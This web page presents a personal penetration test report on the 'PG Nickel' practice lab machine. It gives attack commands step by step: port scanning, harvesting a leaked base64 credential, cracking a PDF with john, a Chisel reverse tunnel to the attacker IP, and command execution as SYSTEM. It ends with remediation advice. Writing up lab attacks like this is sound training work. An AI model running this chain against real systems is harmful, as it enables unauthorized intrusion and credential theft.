<!DOCTYPE html>
<html lang="en" class="scroll-smooth">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PG Nickel – Penetration Test Report</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'cyber-black': '#0b1020',
                        'cyber-gray': '#0f1733',
                        'cyber-green': '#5eead4',
                        'cyber-green-dim': 'rgba(94, 234, 212, 0.1)',
                        'cyber-purple': '#a78bfa',
                        'cyber-red': '#ff003c',
                    },
                    fontFamily: {
                        mono: ['"Fira Code"', 'monospace'],
                        tech: ['"Share Tech Mono"', 'monospace'],
                    },
                    boxShadow: {
                        'neon': '0 0 10px rgba(94, 234, 212, 0.5), 0 0 20px rgba(94, 234, 212, 0.3)',
                    }
                }
            }
        }
    </script>
    <style>
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #0b1020; }
        ::-webkit-scrollbar-thumb { background: #23305f; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #5eead4; }
        .bg-grid {
            background-size: 40px 40px;
            background-image: linear-gradient(to right, rgba(94, 234, 212, 0.05) 1px, transparent 1px),
                              linear-gradient(to bottom, rgba(167, 139, 250, 0.05) 1px, transparent 1px);
        }
        /* Custom Report Styles matching the theme */
        .report-content h2 {
            font-size: 1.5rem;
            font-weight: bold;
            color: white;
            margin-top: 2rem;
            margin-bottom: 1rem;
            border-left: 4px solid #5eead4;
            padding-left: 1rem;
        }
        .report-content h3 {
            font-size: 1.25rem;
            font-weight: bold;
            color: #a78bfa;
            margin-top: 1.5rem;
            margin-bottom: 0.75rem;
        }
        .report-content p {
            margin-bottom: 1rem;
            color: #d1d5db; /* gray-300 */
            line-height: 1.7;
        }
        .report-content ul {
            list-style-type: disc;
            list-style-position: inside;
            margin-bottom: 1rem;
            color: #d1d5db;
        }
        .report-content li {
            margin-bottom: 0.25rem;
        }
        .report-content pre {
            background-color: #0b1020;
            color: #5eead4;
            padding: 1rem;
            border-radius: 0.375rem;
            overflow-x: auto;
            border: 1px solid #23305f;
            margin-bottom: 1rem;
            font-family: 'Fira Code', monospace;
        }
        .report-content code {
            font-family: 'Fira Code', monospace;
            background-color: #1a2342;
            color: #ff003c;
            padding: 0.125rem 0.375rem;
            border-radius: 0.25rem;
            font-size: 0.875em;
        }
        .report-content pre code {
            background-color: transparent;
            color: inherit;
            padding: 0;
            font-size: inherit;
        }
        .command-label {
            font-size: 0.85em;
            color: #9ca3af;
            margin-bottom: 0.25rem;
            font-weight: bold;
            display: block;
            font-family: 'Share Tech Mono', monospace;
        }
        .screenshot-box {
            border: 1px dashed #23305f;
            background-color: rgba(15, 23, 51, 0.5);
            padding: 1rem;
            margin: 1.5rem 0;
            text-align: center;
            border-radius: 0.5rem;
        }
        .screenshot-box img {
            max-width: 100%;
            height: auto;
            display: block;
            margin: 0 auto;
            border-radius: 0.25rem;
            border: 1px solid #23305f;
        }
        .img-placeholder-text {
            color: #6b7280;
            font-style: italic;
            padding: 1rem;
        }
        .critical {
            color: #ff003c;
            font-weight: bold;
        }
    </style>
</head>
<body class="bg-cyber-black text-gray-300 font-mono relative overflow-x-hidden min-h-screen flex flex-col">

    <!-- Background Overlay -->
    <div class="fixed inset-0 bg-grid pointer-events-none z-0"></div>

    <!-- Navbar -->
    <nav class="fixed w-full z-50 bg-cyber-black/90 backdrop-blur-md border-b border-[#23305f]">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex items-center justify-between h-16">
                <div class="flex-shrink-0">
                    <a href="index.html" class="text-2xl font-bold text-cyber-green font-tech tracking-wider">&lt;josh/&gt;</a>
                </div>
                <div>
                    <a href="reports.html" class="flex items-center text-gray-300 hover:text-white transition-colors">
                        <i class="fas fa-arrow-left mr-2"></i> Back to Reports
                    </a>
                </div>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <main class="relative z-10 pt-32 pb-20 max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 flex-grow">
        
        <!-- Header Section -->
        <div class="mb-10 text-center">
            <h1 class="text-3xl md:text-4xl font-bold text-white mb-4 font-tech">
                <span class="text-cyber-green">./</span> PG Nickel – Penetration Test Report
            </h1>
            <div class="flex justify-center gap-4 text-sm text-gray-400">
                <span class="border border-[#23305f] px-3 py-1 rounded bg-cyber-gray">Target: 192.168.139.99</span>
                <span class="border border-[#23305f] px-3 py-1 rounded bg-cyber-gray">Level: Intermediate</span>
            </div>
        </div>

        <!-- Report Content Container -->
        <div class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 md:p-10 shadow-neon report-content">
            
            <h2>1. Executive Summary</h2>
            <p>
                During the penetration test conducted on the target system at <strong>192.168.139.99</strong>, multiple critical misconfigurations and chained vulnerabilities were detected. These vulnerabilities resulted in credential leakage, discovery of internal services, Remote Command Execution (RCE), port forwarding, and ultimately achieving full privileges at the <span class="critical">NT AUTHORITY*</span> level.
            </p>
            <p>The vulnerability chain is summarized as follows:</p>
            <ul>
                <li>Exposed DevOps Dashboard (8089)</li>
                <li>Misconfigured internal API (33333)</li>
                <li>Base64 encoded credential leak</li>
                <li>Encrypted PDF via FTP &rarr; Information Leakage</li>
                <li>Local HTTP Service (127.0.0.1:80) &rarr; RCE</li>
                <li>Port forwarding to access internal service</li>
                <li>Reverse shell &rarr; SYSTEM</li>
            </ul>

            <h2>2. Target Information</h2>
            <ul>
                <li><strong>Target IP:</strong> 192.168.139.99</li>
                <li><strong>Attacker IP:</strong> 192.168.45.239</li>
                <li><strong>User:</strong> ariah</li>
            </ul>

            <h2>3. Enumeration</h2>
            <p>The following critical services were detected during the scan of the target system:</p>
            
            <span class="command-label">Command:</span>
            <pre><code>nmap -sV -p- 192.168.139.99</code></pre>

            <p><strong>Important Ports:</strong></p>
            <ul>
                <li>21/tcp – FTP</li>
                <li>22/tcp – SSH</li>
                <li>8089/tcp – DevOps Dashboard (HTTP)</li>
                <li>33333/tcp – Internal DevOps API (HTTP)</li>
            </ul>

            <div class="screenshot-box">
                <!-- Add your image to a folder named 'images' -->
                <img src="images/nmap.png" alt="Screenshot: Nmap Output" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
                <div class="img-placeholder-text" style="display:none;">[Screenshot Area: Nmap Output - Place 'nmap_scan.png' in images folder]</div>
            </div>

            <h2>4. Port 8089 – DevOps Dashboard Analysis</h2>
            <p>Forms directing to the following endpoints were found on the Dashboard:</p>

            <pre><code>&lt;h1&gt;DevOps Dashboard&lt;/h1&gt;
&lt;form action='http://169.254.164.29:33333/list-current-deployments' method='GET'&gt;
&lt;form action='http://169.254.164.29:33333/list-running-procs' method='GET'&gt;
&lt;form action='http://169.254.164.29:33333/list-active-nodes' method='GET'&gt;</code></pre>

            <p>These requests were redirecting to a directly inaccessible internal API. Since GET calls were rejected, the POST method was attempted via BurpSuite, and the result was successful.</p>

            <div class="screenshot-box">
                <img src="images/8089.png" alt="Screenshot: Dashboard UI" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
                <div class="img-placeholder-text" style="display:none;">[Screenshot Area: Dashboard UI - Place 'dashboard_ui.png' in images folder]</div>
            </div>

            <h2>5. Internal API Process Enumeration – Credential Leak</h2>
            <p>I attempted the endpoints on the WEB service running on port 33333 of the machine IP. However, a message indicated that I could not view it with the GET METHOD. Therefore, I tried the POST Method with BurpSuite. The <code>/list-current-deployments</code> endpoint reached via POST request dumped all processes running on the system. The following line was critical:</p>

            <pre><code>cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml \--user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev</code></pre>

            <p><strong>Base64 Decoding:</strong></p>
            <pre><code>echo "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" | base64 -d
Result: NowiseSloopTheory139</code></pre>

            <p>This credential was valid for both FTP and SSH access.</p>

            <div class="screenshot-box">
                <img src="images/33333_endpoint.png" alt="Screenshot: Credential Leak" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
                <div class="img-placeholder-text" style="display:none;">[Screenshot Area: Credential Leak - Place 'credential_leak.png' in images folder]</div>
            </div>

            <h2>6. FTP Analysis – Encrypted PDF</h2>
            <p>After the FTP connection, an encrypted PDF containing information about the system architecture was obtained.</p>

            <h3>PDF Cracking</h3>
            <pre><code>pdf2john secret.pdf > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>

            <p><strong>Found Password:</strong> <code>ariah4168</code></p>

            <p>The PDF content provided the following critical information:</p>
            <ul>
                <li>Internal command endpoint: <code>http://nickel/?</code></li>
                <li>Backup endpoint: <code>http://nickel-backup/backup</code></li>
                <li>NAS endpoint: <code>http://corp-nas/files</code></li>
            </ul>

            <div class="screenshot-box">
                <img src="images/pdf_content.png" alt="Screenshot: PDF Content" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
                <div class="img-placeholder-text" style="display:none;">[Screenshot Area: PDF Content - Place 'pdf_content.png' in images folder]</div>
            </div>

            <h2>7. SSH Access and Internal Service Discovery</h2>
            <p>SSH login was successfully established:</p>
            <pre><code>ssh ariah@192.168.139.99</code></pre>

            <p>Then, listening services were checked:</p>
            <pre><code>netstat -ano | findstr LISTEN</code></pre>

            <p><strong>Critical Finding:</strong></p>
            <pre><code>127.0.0.1:80   LISTENING</code></pre>
            <p>This port is closed externally and matches the <code>http://nickel/?</code> endpoint mentioned in the PDF.</p>

            <div class="screenshot-box">
                <img src="images/netstat.png" alt="Screenshot: Netstat Output" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
                <div class="img-placeholder-text" style="display:none;">[Screenshot Area: Netstat Output - Place 'netstat_output.png' in images folder]</div>
            </div>

            <h2>8. Port Forwarding (Chisel) to Internal RCE</h2>
            <p>Since SSH port forwarding was restricted, a <strong>Chisel reverse tunnel</strong> was used.</p>

            <span class="command-label">Kali (Attack Machine):</span>
            <pre><code>chisel server -p 9001 --reverse</code></pre>

            <span class="command-label">Target Windows:</span>
            <pre><code>chisel.exe client 192.168.45.239:9001 R:8088:127.0.0.1:80</code></pre>

            <p><strong>Browser Access:</strong></p>
            <pre><code>http://localhost:8088/?whoami</code></pre>

            <p><strong>Output:</strong></p>
            <pre><code>nt authority\system</code></pre>

            <p>This confirmed the RCE has SYSTEM privileges.</p>


            <h2>9. Obtaining SYSTEM Reverse Shell</h2>
            <p>After verifying command execution, a reverse shell was obtained. The process was carried out using a <strong>PowerShell-based download/execute chain</strong>.</p>
            <p><em>(Note: You can add your own payload chain here. In OSCP report format, only used commands are explicitly stated.)</em></p>

            <p><strong>Post-Reverse Shell Check:</strong></p>
            <pre><code>whoami
# nt authority\system</code></pre>

            <p>Flag files were successfully read.</p>


            <h2>10. Conclusion and Recommendations</h2>
            <h3>Vulnerabilities Found:</h3>
            <ul>
                <li>Internal API exposed without authentication.</li>
                <li>Hardcoded credential leakage.</li>
                <li>Sensitive information stored on FTP.</li>
                <li>RCE on Localhost management service.</li>
                <li>Insufficient port filtering.</li>
            </ul>

            <h3>Recommendations:</h3>
            <ul>
                <li>Backend API authentication must be made mandatory.</li>
                <li>Sensitive credentials should not be passed in process arguments.</li>
                <li>FTP should be disabled or secured.</li>
                <li>Backup/command services should undergo code review.</li>
                <li>Local-to-local access should be controlled on the Firewall.</li>
            </ul>

            <hr class="border-[#23305f] my-8">
            
            <h2>Appendices</h2>
            <ul>
                <li>Nmap output visuals</li>
                <li>BurpSuite POST request screenshots</li>
                <li>Process enumeration screenshot</li>
                <li>Decrypted PDF screenshot</li>
                <li>Chisel connection image</li>
                <li>SYSTEM shell proof</li>
            </ul>

        </div>

    </main>

    <!-- Footer -->
    <footer class="bg-black border-t border-[#23305f] py-8 mt-auto relative">
        <div class="max-w-7xl mx-auto px-4 text-center">
            <p class="text-gray-600 text-sm font-mono">
                &copy; 2025 Josh Chalabi. <span class="text-cyber-green">Secure by Design.</span>
            </p>
        </div>
    </footer>

</body>
</html>
